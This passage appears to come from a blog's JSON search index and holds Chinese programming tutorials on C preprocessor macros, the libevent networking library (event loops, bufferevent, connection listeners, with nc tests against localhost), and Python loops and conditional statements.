return b; 2.符号&quot;#“和”##&quot; #是把参数字符串化, ##是连接两个参数 123456789101112131415#include &lt;iostream&gt;using namesapce std;#define A(x) x#define B(x) #x#define C(x,y) x##yint main()&#123; cout &lt;&lt; A(\"hello\")&lt;&lt;endl; cout&lt;&lt;B(hello)&lt;&lt;endl; cout&lt;&lt;C(\"hello\",\"world\")&lt;&lt;endl;&#125;结果：hellohellohelloworld #@ 字符化操作符 1#define ToChar(x) #@x #@x只能用于有传入参数的宏定义中，且必须置于宏定义体中的参数名前。作用是将传的单字符参数名转换成字符，以一对单引用括起来其实就是给x加上单引号，结果返回是一个const char。 举例说： 12char a = ToChar(1); ==&gt; char a=&apos;1&apos;; 做个越界试验 12char a = ToChar(123); ==&gt; char a=&apos;3&apos;; 但是如果你的参数超过四个字符，编译器就给给你报错了！error C2015: too many characters in constant ：P","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"libevent","slug":"libevent","date":"2022-03-15T14:39:06.000Z","updated":"2022-03-27T04:27:44.215Z","comments":true,"path":"2022/03/15/libevent/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/15/libevent/","excerpt":"","text":"学习目标 描述什么是libevent并掌握如何安装 掌握event_base的作用和使用方法 熟练掌握libevent库中的事件循环 掌握event事件的使用方法 掌握bufferevent的工作方式 掌握使用libevent实现tcp服务器端流程 掌握使用Libevent实现tcp客户端流程 libevent介绍 1 事件驱动, 高性能, 轻量级, 专注于网络 2 源代码精炼, 易读 3 跨平台 4 支持多种I/O多路复用技术, 如epoll select poll等 5 支持I/O和信号等事件 libevent的安装 登录官方网站: http://libevent.org, 查看相关信息 libevent源码下载主要分2个大版本： 1.4.x 系列, 较为早期版本, 适合源码学习 2.x系列, 较新的版本, 代码量比1.4版本多很多, 功能也更完善。 libevent的核心实现: 在linux上, 其实质就是epoll反应堆. libevent是事件驱动, epoll反应堆也是事件驱动, 当要监测的事件发生的时候, 就会调用事件对应的回调函数, 执行相应操作. 特别提醒: 事件回调函数是由用户开发的, 但是不是由用户显示去调用的, 而是由libevent去调用的. 从官网http://libevent.org上下载安装文件之后, 将安装文件上传到linux系统上;源码包的安装,以2.0.22版本为例,在官网可以下载到源码包libevent-2.0.22-stable.tar.gz, 安装步骤与第三方库源码包安装方式基本一致。 第一步: 解压libevent-2.0.22-stable.tar.gz 解压: tar -zxvf libevent-2.0.22-stable.tar.gz cd到libevent-2.0.22-stable目录下, 查看README文件, 该文件里描述了安装的详细步骤, 可参照这个文件进行安装. 第二步: 进入源码目录: 执行配置./configure, 检测安装环境, 生成 执行./configure的时候也可以指定路径,./configure --prefix=/usr/xxxxx, 这样就可以安装到指定的目录下, 但是这样在进行源代码编译的时候需要指定用-I头文件的路径和用-L库文件的路径. 若默认安装不指定–prefix, 则会安装到系统默认的路径下, 编译的时候可以不指定头文件和库文件所在的路径. 执行make命令编译整个项目文件. 通过执行make命令, 会生成一些库文件(动态库和静态库)和可执行文件. 执行sudo make install进行安装 安装需要root用户权限, 这一步需要输入当前用户的密码 执行这一步, 可以将刚刚编译成的库文件和可执行文件以及一些头文件拷贝到/usr/local目录下: ----头文件拷贝到了/usr/local/include目录下; ----库文件拷贝到了/usr/local/lib目录下. libevent库的使用 进入到libevent-2.0.22-stable/sample下, 可以查看一些示例源代码文件. 使用libevent库编写代码在编译程序的时候需要指定库名:-levent; 安装文件的libevent库文件所在路径:libevent-2.0.22-stable/.libs; 编写代码的时候用到event.h头文件, 或者直接参考sample目录下的源代码文件也可以. #include &lt;event2/event.h&gt; 编译源代码文件(以hello-world.c文件为例) gcc hello-world.c -levent 由于安装的时候已经将头文件和库文件拷贝到了系统头文件所在路径/usr/local/include和系统库文件所在路径/usr/local/lib, 所以这里编译的时候可以不用指定-I和-L 编译示例代码hello-world.c程序: gcc -o hello-world hello-world.c -levent 测试: 在另一个终端窗口进行测试, 输入: nc 127.1 9995, 然后回车立刻显示Hello, World!字符串. libevent的使用 libevent的地基-event_base 使用libevent 函数之前需要分配一个或者多个 event_base 结构体, 每个event_base结构体持有一个事件集合, 可以检测以确定哪个事件是激活的, event_base结构相当于epoll红黑树的树根节点, 每个event_base都有一种用于检测某种事件已经就绪的 “方法”(回调函数) 通常情况下可以通过event_base_new函数获得event_base结构。 下面介绍一些常用函数: 相关函数说明: 1 1struct event_base *event_base_new(void); //event.h的L:337 函数说明: 获得event_base结构 参数说明: 无 返回值: 成功返回event_base结构体指针; 失败返回NULL; 2 1void event_base_free(struct event_base *); //event.h的L:561 函数说明: 释放event_base指针 3 1int event_reinit(struct event_base *base); //event.h的L:349 函数说明: 如果有子进程, 且子进程也要使用base, 则子进程需要对event_base重新初始化, 此时需要调用event_reinit函数. 函数参数: 由event_base_new返回的执行event_base结构的指针 返回值: 成功返回0, 失败返回-1 对于不同系统而言, event_base就是调用不同的多路IO接口去判断事件是否已经被激活, 对于linux系统而言, 核心调用的就是epoll, 同时支持poll和select. 查看libevent支持的后端的方法有哪些: 1const char **event_get_supported_methods(void); 函数说明: 获得当前系统(或者称为平台)支持的方法有哪些 参数: 无 返回值: 返回二维数组, 类似与main函数的第二个参数**argv. 1const char * event_base_get_method(const struct event_base *base); 函数说明: 获得当前base节点使用的多路io方法 函数参数: event_base结构的base指针. 返回值: 获得当前base节点使用的多路io方法的指针 编写代码获得当前系统支持的多路IO方法和当前所使用的方法: 相关的代码片段如下: 等待事件产生-循环等待event_loop libevent在地基打好之后, 需要等待事件的产生, 也就是等待事件被激活, 所以程序不能退出, 对于epoll来说, 我们需要自己控制循环, 而在libevent中也给我们提供了API接口, 类似where(1)的功能. 函数如下： 1int event_base_loop(struct event_base *base, int flags); //event.h的L:660 函数说明: 进入循环等待事件 参数说明: base: 由event_base_new函数返回的指向event_base结构的指针 flags的取值： #define EVLOOP_ONCE 0x01 只触发一次, 如果事件没有被触发, 阻塞等待 #define EVLOOP_NONBLOCK 0x02 非阻塞方式检测事件是否被触发, 不管事件触发与否, 都会 立即返回. 这个函数一般不用, 而大多数都调用libevent给我们提供的另外一个API： 1int event_base_dispatch(struct event_base *base); //event.h的L:364 函数说明: 进入循环等待事件 参数说明:由event_base_new函数返回的指向event_base结构的指针 调用该函数, 相当于没有设置标志位的event_base_loop。程序将会一直运行, 直到没有需要检测的事件了, 或者被结束循环的API终止。 1234567891011int event_base_loopexit(struct event_base *base, const struct timeval *tv);int event_base_loopbreak(struct event_base *base);struct timeval &#123;long tv_sec; long tv_usec; &#125;; 两个函数的区别是如果正在执行激活事件的回调函数, 那么event_base_loopexit将在事件回调执行结束后终止循环（如果tv时间非NULL, 那么将等待tv设置的时间后立即结束循环）, 而event_base_loopbreak会立即终止循环。 使用libevent库的步骤： 1 创建根节点–event_base_new 2 设置监听事件和数据可读可写的事件的回调函数 设置了事件对应的回调函数以后, 当事件产生的时候会自动调用回调函数 3 事件循环–event_base_dispatch 相当于while(1), 在循环内部等待事件的发生, 若有事件发生则会触发事件对应的回调函数。 4 释放根节点–event_base_free 释放由event_base_new和event_new创建的资源, 分别调用event_base_free 和event_free函数. 事件驱动-event 事件驱动实际上是libevent的核心思想, 本小节主要介绍基本的事件event。 主要的状态转化： 主要几个状态： 无效的指针: 此时仅仅是定义了 struct event *ptr； 非未决：相当于创建了事件, 但是事件还没有处于被监听状态, 类似于我们使用epoll的时候定义了struct epoll_event ev并且对ev的两个字段进行了赋值, 但是此时尚未调用epoll_ctl对事件上树. 未决：就是对事件开始监听, 暂时未有事件产生。相当于调用epoll_ctl对要监听的事件上树, 但是没有事件产生. 激活：代表监听的事件已经产生, 这时需要处理, 相当于调用epoll_wait函数有返回, 当事件被激活以后, libevent会调用该事件对应的回调函数. libevent的事件驱动对应的结构体为struct event, 对应的函数在图上也比较清晰, 下面介绍一下主要的函数: 1typedef void (*event_callback_fn)(evutil_socket_t fd, short events, void *arg); 1struct event *event_new(struct event_base *base, evutil_socket_t fd, short events, event_callback_fn cb, void *arg); 函数说明: event_new负责创建event结构指针, 同时指定对应的地基base, 还有对应的文件描述符, 事件, 以及回调函数和回调函数的参数。 参数说明： base: 对应的根节点–地基 fd: 要监听的文件描述符 events:要监听的事件 12345678910111213#define EV_TIMEOUT 0x01 //超时事件#define EV_READ 0x02 //读事件#define EV_WRITE 0x04 //写事件#define EV_SIGNAL 0x08 //信号事件#define EV_PERSIST 0x10 //周期性触发#define EV_ET 0x20 //边缘触发, 如果底层模型支持设置 则有效, 若不支持则无效.若要想设置持续的读事件则： EV_READ | EV_PERSIST cb 回调函数, 原型如下： 1typedef void (*event_callback_fn)(evutil_socket_t fd, short events, void *arg); 注意: 回调函数的参数就对应于event_new函数的fd, event和arg 12#define evsignal_new(b, x, cb, arg) \\ event_new((b), (x), EV_SIGNAL|EV_PERSIST, (cb), (arg)) 1int event_add(struct event *ev, const struct timeval *timeout); 函数说明: 将非未决态事件转为未决态, 相当于调用epoll_ctl函数(EPOLL_CTL_ADD), 开始监听事件是否产生, 相当于epoll的上树操作. 参数说明： ev: 调用event_new创建的事件 timeout: 限时等待事件的产生, 也可以设置为NULL, 没有限时。 1int event_del(struct event *ev); 函数说明: 将事件从未决态变为非未决态, 相当于epoll的下树（epoll_ctl调用 EPOLL_CTL_DEL操作）操作。 参数说明: ev指的是由event_new创建的事件. 1void event_free(struct event *ev); 函数说明: 释放由event_new申请的event节点。 编写一个基于event实现的tcp服务器： 总体步骤： 1 搭建服务器的固定三步： 创建socket 绑定bind 监听listen 2 调用event_base_new函数创建event_base节点 3 创建要监听的事件event, 主要就是监听事件和读数据的事件 ​ --设置好监听事件的回调函数,然后event_add上树----&gt;有新的连接, 则 调用accept接受新的连接----&gt;将这个新的连接设置好回调函数(一般 是设置读事件), 然后继续event_add上树, 若有客户端关闭连接则 从树上摘除该事件节点. 4 调用event_base_dispatch进入循环等待事件的发生 5 释放资源 调用event_base_free释放根节点和调用event_free释放事件节点 测试代码: 程序名称: 02_server.c 测试过程: 编译源代码: gcc -o 02_server 02_server.c -levent 启动程序: ./02_server 在其他终端窗口上使用nc命令进行测试: nc 127.1 8888, 多开几个终端窗口使用nc命令进行测试. 发现问题: 当使用多个客户端(nc命令模拟客户端程序)进行测试的时候, 特别是当关闭所有客户端程序的时候, 若再次开启nc命令, 会发现异常. 分析原因: 在02_server.c代码中,L:11处 1struct event *readev = NULL; 是一个全局变量, 当有多个客户端请求服务的时候, 如2个客户端请求服务的时候, 第二次readev的值会将第一次readev的值覆盖掉: 代码L:55处 1readev = event_new(base, cfd, EV_READ | EV_PERSIST, readcb, base); 可以进行如下的测试重现异常情况: 先后在终端A和B上执行nc 127.1 8888命令, 然后ctrl+c结束掉终端A上的nc命令, 再次进如到终端B上, 则会出现异常情况.(原因是由于readev是一个全局变量, 所以readev只能保留最后一次所赋的值, 当客户端退出后, 服务端会调用event_del(readev);从根节点上摘除该事件, 此时其实从base节点上摘掉的是最后一个event事件节点, 所以最后一个客户端会出现异常, 其实只要是开启了多个客户端, 而且关闭客户端的时候只要不是关闭最后一个客户端, 都会出现这种异常情况) 若先结束终端B上的nc命令, 不会出现异常情况. 解决办法: 可以将对应事件的文件描述符和事件做一个映射, 说的通俗一点就是可以将fd和event定义在一个结构体当中, 然后定义一个结构体数组, 这样可以使fd和event形成一个一对一的映射关系, 通过fd就可以找到event. 1234567struct event_fd&#123; evutil_socket_t fd; struct event *ev;&#125;event[MAX]; 详情见代码部分. 02_server_adv.c, 结合代码进行理解. 自带buffer的事件-bufferevent bufferevent实际上也是一个event, 只不过比普通的event高级一些, 它的内部有两个缓冲区, 以及一个文件描述符（网络套接字）。一个网络套接字有读和写两个缓冲区, bufferevent同样也带有两个缓冲区, 还有就是libevent事件驱动的核心回调函数, 那么四个缓冲区以及触发回调的关系如下： 从图中可以得知, 一个bufferevent对应两个缓冲区, 三个回调函数, 分别是写回调, 读回调和事件回调. bufferevent有三个回调函数： 读回调 – 当bufferevent将底层读缓冲区的数据读到自身的读缓冲区时触发读事件回调. 写回调 – 当bufferevent将自身写缓冲的数据写到底层写缓冲区的时候触发写事件回调, 由于数据最终是写入了内核的写缓冲区中, 应用程序已经无法控制, 这个事件对于应用程序来说基本没什么用, 只是通知功能. 事件回调 – 当bufferevent绑定的socket连接, 断开或者异常的时候触发事件回调. 主要使用的函数如下： 1struct bufferevent *bufferevent_socket_new(struct event_base *base, evutil_socket_t fd, int options); 函数说明: bufferevent_socket_new 对已经存在socket创建bufferevent事件, 可用于后面讲到的连接监听器的回调函数中. 参数说明： base :对应根节点 fd :文件描述符 options : bufferevent的选项 BEV_OPT_CLOSE_ON_FREE – 释放bufferevent自动关闭底层接口(当bufferevent被释放以后, 文件描述符也随之被close) BEV_OPT_THREADSAFE – 使bufferevent能够在多线程下是安全的 1int bufferevent_socket_connect(struct bufferevent *bev, struct sockaddr *serv, int socklen); 函数说明: 该函数封装了底层的socket与connect接口, 通过调用此函数, 可以将bufferevent事件与通信的socket进行绑定, 参数如下： bev – 需要提前初始化的bufferevent事件 serv – 对端(一般指服务端)的ip地址, 端口, 协议的结构指针 socklen – 描述serv的长度 说明: 调用此函数以后, 通信的socket与bufferevent缓冲区做了绑定, 后面调用了bufferevent_setcb函数以后, 会对bufferevent缓冲区的读写操作的事件设置回调函数, 当往缓冲区中写数据的时候会触发写回调函数, 当数据从socket的内核缓冲区读到bufferevent读缓冲区中的时候会触发读回调函数. 1void bufferevent_free(struct bufferevent *bufev); 函数说明: 释放bufferevent 12345void bufferevent_setcb(struct bufferevent *bufev, bufferevent_data_cb readcb, bufferevent_data_cb writecb,bufferevent_event_cb eventcb, void *cbarg); 函数说明: bufferevent_setcb用于设置bufferevent的回调函数, readcb, writecb, eventcb分别对应了读回调, 写回调, 事件回调, cbarg代表回调函数的 参数。 回调函数的原型： 1typedef void (*bufferevent_data_cb)(struct bufferevent *bev, void *ctx); 1typedef void (*bufferevent_event_cb)(struct bufferevent *bev, short what, void *ctx); What 代表 对应的事件 1234567BEV_EVENT_EOF--遇到文件结束指示BEV_EVENT_ERROR--发生错误BEV_EVENT_TIMEOUT--发生超时BEV_EVENT_CONNECTED--请求的过程中连接已经完成 1int bufferevent_write(struct bufferevent *bufev, const void *data, size_t size); bufferevent_write是将data的数据写到bufferevent的写缓冲区 1int bufferevent_write_buffer(struct bufferevent *bufev, struct evbuffer *buf); bufferevent_write_buffer 是将数据写到写缓冲区另外一个写法, 实际上bufferevent的内部的两个缓冲区结构就是struct evbuffer。 1size_t bufferevent_read(struct bufferevent *bufev, void *data, size_t size); bufferevent_read 是将bufferevent的读缓冲区数据读到data中, 同时将读到的数据从bufferevent的读缓冲清除。 1int bufferevent_read_buffer(struct bufferevent *bufev, struct evbuffer *buf); bufferevent_read_buffer 将bufferevent读缓冲数据读到buf中, 接口的另外一种。 1int bufferevent_enable(struct bufferevent *bufev, short event); 1int bufferevent_disable(struct bufferevent *bufev, short event); bufferevent_enable与bufferevent_disable是设置事件是否生效, 如果设置为disable, 事件回调将不会被触发。 链接监听器-evconnlistener 链接监听器封装了底层的socket通信相关函数, 比如socket, bind, listen, accept这几个函数。链接监听器创建后实际上相当于调用了socket, bind, listen, 此时等待新的客户端连接到来, 如果有新的客户端连接, 那么内部先进行调用accept处理, 然后调用用户指定的回调函数。可以先看看函数原型, 了解一下它是怎么运作的： 函数声明所在的头文件: event2/listener.h 1234567struct evconnlistener *evconnlistener_new_bind(struct event_base *base, evconnlistener_cb cb, void *ptr, unsigned flags, int backlog,const struct sockaddr *sa, int socklen);//backlog是监听队列数,最多可以有多少个客户端进行三次握手 函数说明: 是在当前没有套接字的情况下对链接监听器进行初始化, 看最后2个参数实际上就是bind使用的关键参数, backlog是listen函数的关键参数（略有不同的是, 如果backlog是-1, 那么监听器会自动选择一个合适的值, 如果填0, 那么监听器会认为listen函数已经被调用过了）, ptr是回调函数的参数, cb是有新连接之后的回调函数, 但是注意这个回调函数触发的时候, 链接器已经处理好新连接了, 并将与新连接通信的描述符交给回调函数。flags 需要参考几个值： 1234567LEV_OPT_LEAVE_SOCKETS_BLOCKING 文件描述符为阻塞的LEV_OPT_CLOSE_ON_FREE 关闭时自动释放LEV_OPT_REUSEABLE 端口复用LEV_OPT_THREADSAFE 分配锁, 线程安全 12345struct evconnlistener *evconnlistener_new(struct event_base *base, evconnlistener_cb cb, void *ptr, unsigned flags, int backlog,evutil_socket_t fd); evconnlistener_new函数与前一个函数不同的地方在与后2个参数, 使用本函数时, 认为socket已经初始化好, 并且bind完成, 甚至也可以做完listen, 所以大多数时候, 我们都可以使用第一个函数。 两个函数的回调函数 1typedef void (*evconnlistener_cb)(struct evconnlistener *evl, evutil_socket_t fd, struct sockaddr *cliaddr, int socklen, void *ptr); 回调函数fd参数是与客户端通信的描述符, 并非是等待连接的监听的那个描述符, 所以cliaddr对应的也是新连接的对端地址信息, 已经是accept处理好的。 1void evconnlistener_free(struct evconnlistener *lev); 函数说明: 释放链接监听器 1int evconnlistener_enable(struct evconnlistener *lev); 函数说明: 使链接监听器生效 1int evconnlistener_disable(struct evconnlistener *lev); 函数说明: 使链接监听器失效 如果上述函数都较为了解了, 可以尝试去看懂hello-world.c的代码, 在安装包的sample目录下, 其中有涉及到信号的函数, 看看自己能否找到函数的原型在哪？实际上就是一个宏定义, 也是我们之前介绍的event_new函数, 只是对应一个信号事件而已, 处理机制略有不同。 123#define evsignal_new(b, x, cb, arg) \\event_new((b), (x), EV_SIGNAL|EV_PERSIST, (cb), (arg)) 代码测试: 思路hello-world.c代码中当使用nc客户端测试的时候为什么nc收到hello world之后就立刻关闭了. 答案: 当服务器收到新的连接请求的时候, 会自动触发listener_cb回调函数, 该函数中有往bufferevent缓冲区中写入的操作(调用bufferevent_write), 接着又会触发写回调函数conn_writecb的执行, 这个回调函数中调用了bufferevent_free, 该函数能够释放bufferevent, 同时会关闭socket连接. 若是按下crtl+c会将程序终止, 此时会触发异常事件的退出函数(conn_eventcb) hello-world.c代码没有读事件触发, 可以将代码进行修改, 将bufferevent的读事件添加上. 思考: 如何修改hello-world.c添加读回调. libevent客户端代码阅读和分析. 画hello-world.c代码的改进版的流程图. 总结的话: 对于bufferevent来说, 一个文件描述符, 2个缓冲区, 3个回调函数 文件描述符是用于和客户端进行通信的通信文件描述符, 并不是监听的文件描述符 2个缓冲区是指: 一个bufferevent包括读缓冲区和写缓冲区 3个回调函数指: 读回调函数 写回调函数 和事件回调函数(客户端关闭连接或者是被信号终止进程会触发事件回调函数) 其中写回调基本上没什么用, 事件回调指的是socket上的连接和断开,异常等情况会触发bufferevent的事件回调. 读回调函数的触发时机: 当socket的内核socket读缓冲区中有数据的时候, bufferevent会将内核缓冲区中的数据读到自身的读缓冲区, 会触发bufferevent的读操作, 此时会调用bufferevent的读回调函数. 写回调函数的触发时机: 当往bufferevent的写缓冲区写入数据的时候, bufferevent底层会把缓冲区中的数据写入到内核的socket的写缓冲区中, 此时会触发bufferevent的写回调函数, 最后由内核的驱动程序将数据发送出去.","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"循环","slug":"循环","date":"2022-03-06T08:32:48.000Z","updated":"2022-03-06T08:33:19.134Z","comments":true,"path":"2022/03/06/循环/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/06/循环/","excerpt":"","text":"目标 了解循环 while语法【重点】 while应用 break和continue while循环嵌套【重点】 while循环嵌套应用【难点】 for循环 一. 循环简介 1.1 循环的作用 思考：假如我有个女朋友，有一天我们闹矛盾生气了，女朋友说：道歉，说100遍“媳妇儿，我错了”。这个时候程序员会怎么做？ 答：100遍print('媳妇儿，我错了') 思考：复制粘贴100次吗？ 答：重复执行100次一样的代码，程序中循环即可 循环的作用：让代码更高效的重复执行。 1.2 循环的分类 在Python中，循环分为while和for两种，最终实现效果相同。 二. while的语法 1234while 条件: 条件成立重复执行的代码1 条件成立重复执行的代码2 ...... 2.1 快速体验 需求：复现重复执行100次print('媳妇儿，我错了')（输出更简洁一些，我们这里设置5次）。 分析：初始值是0次，终点是5次，重复做的事情输出“媳妇儿， 我错了”。 1234567# 循环的计数器i = 0while i &lt; 5: print('媳妇儿，我错了') i += 1print('任务结束') 三. while的应用 3.1 应用一：计算1-100累加和 分析：1-100的累加和，即1 + 2 + 3 + 4 +….，即前两个数字的相加结果 + 下一个数字( 前一个数字 + 1)。 12345678i = 1result = 0while i &lt;= 100: result += i i += 1# 输出5050print(result) 注意：为了验证程序的准确性，可以先改小数值，验证结果正确后，再改成1-100做累加。 3.2 应用二：计算1-100偶数累加和 分析：1-100的偶数和，即 2 + 4 + 6 + 8…，得到偶数的方法如下： 偶数即是和2取余结果为0的数字，可以加入条件语句判断是否为偶数，为偶数则累加 初始值为0 / 2 , 计数器每次累加2 3.2.1 方法一：条件判断和2取余数则累加 12345678910# 方法一：条件判断和2取余数为0则累加计算i = 1result = 0while i &lt;= 100: if i % 2 == 0: result += i i += 1# 输出2550print(result) 3.2.2 方法二：计数器控制 123456789# 方法二：计数器控制增量为2i = 0result = 0while i &lt;= 100: result += i i += 2# 输出2550print(result) 四、break和continue break和continue是循环中满足一定条件退出循环的两种不同方式。 4.1 理解 举例：一共吃5个苹果，吃完第一个，吃第二个…，这里&quot;吃苹果&quot;的动作是不是重复执行？ 情况一：如果吃的过程中，吃完第三个吃饱了，则不需要再吃第4个和第五个苹果，即是吃苹果的动作停止，这里就是break控制循环流程，即终止此循环。 情况二：如果吃的过程中，吃到第三个吃出一个大虫子…,是不是这个苹果就不吃了，开始吃第四个苹果，这里就是continue控制循环流程，即退出当前一次循环继而执行下一次循环代码。 4.1.1 情况一：break 1234567i = 1while i &lt;= 5: if i == 4: print(f'吃饱了不吃了') break print(f'吃了第&#123;i&#125;个苹果') i += 1 执行结果： 4.1.2 情况二：continue 123456789i = 1while i &lt;= 5: if i == 3: print(f'大虫子，第&#123;i&#125;个不吃了') # 在continue之前一定要修改计数器，否则会陷入死循环 i += 1 continue print(f'吃了第&#123;i&#125;个苹果') i += 1 执行结果： 五. while循环嵌套 5.1 应用场景 故事梗概：有天女朋友又生气了，惩罚：说3遍“媳妇儿， 我错了”，这个程序是不是循环即可？但如果女朋友说：还要刷今天晚饭的碗，这个程序怎么书写？ 123while 条件: print('媳妇儿， 我错了')print('刷晚饭的碗') 但如果女朋友还是生气，把这套惩罚要连续3天都执行，有如何书写程序？ 1234while 条件: while 条件: print('媳妇儿， 我错了') print('刷晚饭的碗') 5.2 语法 123456while 条件1: 条件1成立执行的代码 ...... while 条件2: 条件2成立执行的代码 ...... 总结：所谓while循环嵌套，就是一个while里面嵌套一个while的写法，每个while和之前的基础语法是相同的。 5.3 快速体验：复现场景 5.3.1 代码 123456789j = 0while j &lt; 3: i = 0 while i &lt; 3: print('媳妇儿，我错了') i += 1 print('刷晚饭的碗') print('一套惩罚结束----------------') j += 1 5.3.2 执行结果 5.3.3 理解执行流程 当内部循环执行完成之后，再执行下一次外部循环的条件判断。 六. while循环嵌套应用 6.1 应用一：打印星号(正方形) 6.1.1 需求 12345************************* 6.1.2 代码 分析：一行输出5个星号，重复打印5行 123456789101112# 重复打印5行星星j = 0while j &lt;= 4: # 一行星星的打印 i = 0 while i &lt;= 4: # 一行内的星星不能换行，取消print默认结束符\\n print('*', end='') i += 1 # 每行结束要换行，这里借助一个空的print，利用print默认结束符换行 print() j += 1 6.2 应用二：打印星号(三角形) 6.2.1 需求 12345*************** 6.2.2 代码 分析：一行输出星星的个数和行号是相等的，每行：重复打印行号数字个星号，将打印行星号的命令重复执行5次实现打印5行。 123456789101112# 重复打印5行星星# j表示行号j = 0while j &lt;= 4: # 一行星星的打印 i = 0 # i表示每行里面星星的个数，这个数字要和行号相等所以i要和j联动 while i &lt;= j: print('*', end='') i += 1 print() j += 1 6.3 九九乘法表 6.3.1 执行结果 6.3.2 代码 12345678910# 重复打印9行表达式j = 1while j &lt;= 9: # 打印一行里面的表达式 a * b = a*b i = 1 while i &lt;= j: print(f'&#123;i&#125;*&#123;j&#125;=&#123;j*i&#125;', end='\\t') i += 1 print() j += 1 七、for循环 7.1 语法 1234for 临时变量 in 序列: 重复执行的代码1 重复执行的代码2 ...... 7.2 快速体验 123str1 = 'itheima'for i in str1: print(i) 执行结果： 7.3 break 123456str1 = 'itheima'for i in str1: if i == 'e': print('遇到e不打印') break print(i) 执行结果： 7.4 continue 123456str1 = 'itheima'for i in str1: if i == 'e': print('遇到e不打印') continue print(i) 执行结果： 八. else 循环可以和else配合使用，else下方缩进的代码指的是当循环正常结束之后要执行的代码。 8.1 while…else 需求：女朋友生气了，要惩罚：连续说5遍“媳妇儿，我错了”，如果道歉正常完毕女朋友就原谅我了，这个程序怎么写？ 12345i = 1while i &lt;= 5: print('媳妇儿，我错了') i += 1print('媳妇儿原谅我了...') 思考： 这个print是不是没有循环也能执行？ 8.1.1 语法 1234while 条件: 条件成立重复执行的代码else: 循环正常结束之后要执行的代码 8.1.2 示例 123456i = 1while i &lt;= 5: print('媳妇儿，我错了') i += 1else: print('媳妇原谅我了，真开心，哈哈哈哈') 8.1.3 退出循环的方式 需求：女朋友生气，要求道歉5遍：媳妇儿，我错了。道歉到第三遍的时候，媳妇埋怨这一遍说的不真诚，是不是就是要退出循环了？这个退出有两种可能性： 更生气，不打算原谅，也不需要道歉了，程序如何书写？ 只一遍不真诚，可以忍受，继续下一遍道歉，程序如何书写？ break 123456789i = 1while i &lt;= 5: if i == 3: print('这遍说的不真诚') break print('媳妇儿，我错了') i += 1else: print('媳妇原谅我了，真开心，哈哈哈哈') 所谓else指的是循环正常结束之后要执行的代码，即如果是break终止循环的情况，else下方缩进的代码将不执行。 continue 12345678910i = 1while i &lt;= 5: if i == 3: print('这遍说的不真诚') i += 1 continue print('媳妇儿，我错了') i += 1else: print('媳妇原谅我了，真开心，哈哈哈哈') 因为continue是退出当前一次循环，继续下一次循环，所以该循环在continue控制下是可以正常结束的，当循环结束后，则执行了else缩进的代码。 8.2 for…else 8.2.1 语法 12345for 临时变量 in 序列: 重复执行的代码 ...else: 循环正常结束之后要执行的代码 所谓else指的是循环正常结束之后要执行的代码，即如果是break终止循环的情况，else下方缩进的代码将不执行。 8.2.2 示例 12345str1 = 'itheima'for i in str1: print(i)else: print('循环正常结束之后执行的代码') 8.2.3 退出循环的方式 break终止循环 12345678str1 = 'itheima'for i in str1: if i == 'e': print('遇到e不打印') break print(i)else: print('循环正常结束之后执行的代码') 执行结果： 没有执行else缩进的代码。 continue控制循环 12345678str1 = 'itheima'for i in str1: if i == 'e': print('遇到e不打印') continue print(i)else: print('循环正常结束之后执行的代码') 执行结果： 因为continue是退出当前一次循环，继续下一次循环，所以该循环在continue控制下是可以正常结束的，当循环结束后，则执行了else缩进的代码。 总结 循环的作用：控制代码重复执行 while语法 1234while 条件: 条件成立重复执行的代码1 条件成立重复执行的代码2 ...... while循环嵌套语法 123456while 条件1: 条件1成立执行的代码 ...... while 条件2: 条件2成立执行的代码 ...... for循环语法 1234for 临时变量 in 序列: 重复执行的代码1 重复执行的代码2 ...... break退出整个循环 continue退出本次循环，继续执行下一次重复执行的代码 else while和for都可以配合else使用 else下方缩进的代码含义：当循环正常结束后执行的代码 break终止循环不会执行else下方缩进的代码 continue退出循环的方式执行else下方缩进的代码","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[]},{"title":"条件语句","slug":"条件语句","date":"2022-03-06T08:03:30.000Z","updated":"2022-03-06T08:34:18.652Z","comments":true,"path":"2022/03/06/条件语句/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/06/条件语句/","excerpt":"","text":"目标 条件语句作用 if语法 if…else… 多重判断 if嵌套 一. 了解条件语句 假设一个场景： 同学们这个年龄去过网吧吗？ 去网吧进门想要上网必须做的一件事是做什么？（考虑重点） 为什么要把身份证给工作人员？ 是不是就是为了判断是否成年？ 是不是如果成年可以上网？如果不成年则不允许上网？ 其实这里所谓的判断就是条件语句，即条件成立执行某些代码，条件不成立则不执行这些代码。 二. if 语法 2.1 语法 1234if 条件: 条件成立执行的代码1 条件成立执行的代码2 ...... 2.2 快速体验 123456if True: print('条件成立执行的代码1') print('条件成立执行的代码2')# 下方的代码没有缩进到if语句块，所以和if条件无关print('我是无论条件是否成立都要执行的代码') 执行结果如下： 三. 实例：上网 需求分析：如果用户年龄大于等于18岁，即成年，输出&quot;已经成年，可以上网&quot;。 3.1 简单版 12345age = 20if age &gt;= 18: print('已经成年，可以上网')print('系统关闭') 3.2 进阶版 新增需求：用户可以输出自己的年龄，然后系统进行判断是否成年，成年则输出&quot;您的年龄是’用户输入的年龄’，已经成年，可以上网&quot;。 12345678# input接受用户输入的数据是字符串类型，条件是age和整型18做判断，所以这里要int转换数据类型age = int(input('请输入您的年龄：'))if age &gt;= 18: print(f'您的年龄是&#123;age&#125;,已经成年，可以上网')print('系统关闭') 四. if…else… 作用：条件成立执行if下方的代码; 条件不成立执行else下方的代码。 思考：网吧上网的实例，如果成年，允许上网，如果不成年呢？是不是应该回复用户不能上网？ 4.1 语法 12345678if 条件: 条件成立执行的代码1 条件成立执行的代码2 ......else: 条件不成立执行的代码1 条件不成立执行的代码2 ...... 4.2 实用版：网吧上网 12345678age = int(input('请输入您的年龄：'))if age &gt;= 18: print(f'您的年龄是&#123;age&#125;,已经成年，可以上网')else: print(f'您的年龄是&#123;age&#125;,未成年，请自行回家写作业')print('系统关闭') 注意：如果条件成立执行了某些代码，那么其他的情况的代码将不会执行。 五、多重判断 思考：中国合法工作年龄为18-60岁，即如果年龄小于18的情况为童工，不合法；如果年龄在18-60岁之间为合法工龄；大于60岁为法定退休年龄。 5.1 语法 1234567891011if 条件1: 条件1成立执行的代码1 